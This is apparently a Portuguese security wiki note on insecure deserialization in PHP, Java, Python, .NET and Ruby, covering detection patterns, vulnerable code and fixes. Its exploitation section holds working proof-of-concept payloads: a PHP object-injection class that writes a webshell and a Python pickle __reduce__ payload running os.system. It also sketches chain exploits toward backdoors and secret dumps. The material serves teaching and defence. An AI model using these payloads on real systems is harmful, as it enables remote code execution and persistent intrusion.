# Deserialização Insegura

**Tags:** #critico #deserializacao #rce #java #php #python #dotnet
**OWASP:** A08:2021 — Software and Data Integrity Failures
**CVSS Base:** 9.8 (Crítico — RCE por design)

---

## 📖 O que é

Deserialização de dados não confiáveis é uma das poucas vulnerabilidades que garante RCE por design. O atacante controla os dados serializados e, ao serem deserializados pelo servidor, executa código arbitrário via "gadget chains" — sequências de objetos legítimos encadeados de forma maliciosa.

---

## 🔍 `grep_search` por Linguagem

```
# PHP
unserialize(

# Java
ObjectInputStream(
readObject(
readUnshared(

# Python
pickle.loads(
pickle.load(
cPickle
shelve.open(

# .NET
BinaryFormatter
NetDataContractSerializer
SoapFormatter
JavaScriptSerializer

# Ruby
Marshal.load(
YAML.load(

# Node.js
node-serialize
serialize-javascript
```

---

## 💣 Exploração por Linguagem

### 🐘 PHP — `unserialize()`

**Magic methods explorados:**
- `__wakeup()` — chamado automaticamente ao deserializar
- `__destruct()` — chamado quando o objeto é destruído
- `__toString()` — chamado quando o objeto é convertido a string

```php
// ❌ VULNERÁVEL — input de cookie/GET/POST
$data = unserialize($_COOKIE['user_data']);
$data = unserialize(base64_decode($_GET['obj']));
```

**Payload de PoC — PHP Object Injection:**
```php
<?php
class Logger {
    public $log_file = "/var/www/html/shell.php";
    public $log_data = "<?php system($_GET['cmd']); ?>";

    function __destruct() {
        file_put_contents($this->log_file, $this->log_data);
    }
}

$payload = serialize(new Logger());
echo base64_encode($payload);
```

---

### ☕ Java — `ObjectInputStream`

**Gadget Chains Conhecidas (via ysoserial):**

| Gadget | Biblioteca | Condição |
|---|---|---|
| CommonsCollections1-7 | Apache Commons Collections ≤ 3.2.1 | No classpath |
| Spring1 | Spring Framework | No classpath |
| Groovy1 | Groovy | No classpath |
| JBoss | JBoss | No classpath |
| WebLogic | Oracle WebLogic | Patched versões antigas |

```java
// ❌ VULNERÁVEL
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject();  // RCE se gadget chain disponível
```

**Detecção de magic bytes Java serializado:**
```
Bytes: AC ED 00 05  (hex) = rO0AB (base64 prefixo)
```

---

### 🐍 Python — `pickle`

```python
# ❌ VULNERÁVEL
import pickle, base64
data = pickle.loads(base64.b64decode(request.form['data']))
```

**PoC — Payload de RCE via `__reduce__`:**
```python
import pickle, os, base64

class RCEPayload(object):
    def __reduce__(self):
        return (os.system, ('id > /tmp/pwned',))

payload = base64.b64encode(pickle.dumps(RCEPayload()))
print(payload.decode())
# Enviar este payload no campo 'data'
```

---

### 🔷 .NET — `BinaryFormatter`

> `BinaryFormatter` foi oficialmente **deprecado pela Microsoft** por ser inseguro por design.

```csharp
// ❌ VULNERÁVEL — BinaryFormatter
BinaryFormatter bf = new BinaryFormatter();
object obj = bf.Deserialize(stream);  // RCE se gadget disponível
```

**Gadget Principal:** `TypeConfuseDelegate`  
**Ferramentas:** ysoserial.net

---

### 💎 Ruby — `Marshal.load`

```ruby
# ❌ VULNERÁVEL
data = Marshal.load(Base64.decode64(params[:data]))
```

---

## 🧠 Detecção em Código REST/API

> Preste atenção em endpoints que recebem dados binários codificados ou formatos customizados:

```
- Parâmetros com valores base64 longos no cookie ou body
- Endpoints que aceitam Content-Type: application/octet-stream
- Headers com AC ED 00 05 ou rO0AB (Java serialized)
- Cookies com O:8:"NomeClasse" (PHP serialized)
```

---

## 🛡️ Correção

### PHP
```php
// ✅ Usar JSON em vez de serialization nativa
$data = json_decode($_COOKIE['user_data'], true);

// ✅ Se necessário serializar: HMAC para integridade
$serialized = base64_encode(serialize($safe_object));
$hmac = hash_hmac('sha256', $serialized, SECRET_KEY);
// Verificar HMAC antes de deserializar
```

### Java
```java
// ✅ Filtro de classes permitidas
ObjectInputStream ois = new ObjectInputStream(stream) {
    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException {
        if (!ALLOWED_CLASSES.contains(desc.getName())) {
            throw new InvalidClassException("Classe não permitida: " + desc.getName());
        }
        return super.resolveClass(desc);
    }
};
```

### Python
```python
# ✅ Usar JSON ou msgpack em vez de pickle para dados externos
import json
data = json.loads(request.form['data'])

# ✅ Se precisar serializar: cryptography.fernet para integridade
from cryptography.fernet import Fernet
f = Fernet(key)
data = f.decrypt(token)  # só descriptografa se o HMAC bater
```

---

## 🔗 Chain Exploits

```
Deserialization RCE + root container → Fuga de container
Deserialization RCE + credenciais no env → dump de secrets completo
PHP Object Injection + webshell write → backdoor persistente
Java Deserialization + /admin endpoint → comprometimento sem credenciais
```

---

## 📌 Referências
- [[Command Injection & RCE]]
- [[IaC Security — Docker Kubernetes Terraform]]
- [ysoserial (Java)](https://github.com/frohoff/ysoserial)
- [OWASP Deserialization](https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data)
